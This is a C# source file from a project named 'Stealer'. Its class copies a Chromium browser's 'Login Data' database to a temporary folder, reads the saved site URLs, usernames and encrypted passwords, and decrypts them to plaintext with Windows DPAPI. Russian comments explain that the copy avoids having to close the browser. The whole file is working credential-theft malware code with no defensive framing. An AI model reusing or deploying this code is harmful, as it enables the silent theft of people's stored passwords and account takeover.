using System;
using System.Collections.Generic;
using System.IO;
using System.Text;





namespace Stealer
{
    class Passwords
    {
        static public IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
        {
            if (File.Exists(Path.GetTempPath() + @"log\Login Data"))    // Если файл по данному пути существует, то удаляем его
            {
                File.Delete(Path.GetTempPath() + @"log\Login Data");
            }
            File.Copy(dbPath, Path.GetTempPath() + @"log\Login Data");      // копируем файл с паролями для того, чтобы не закрывать браузер
            dbPath = Path.GetTempPath() + @"log\Login Data";
            var connectionString = "Data Source=" + dbPath + ";pooling=false";
            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {


                cmd.CommandText = "SELECT password_value,username_value,origin_url FROM logins";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        var encryptedData = (byte[])reader[0];

                        var decodedData = System.Security.Cryptography.ProtectedData.Unprotect(encryptedData, null, System.Security.Cryptography.DataProtectionScope.CurrentUser);   // расшифровка паролей
                        var plainText = Encoding.ASCII.GetString(decodedData);

                        yield return Tuple.Create(reader.GetString(2), reader.GetString(1), plainText);

                    }

                }
                conn.Close();
            }
        }


    }
    
}
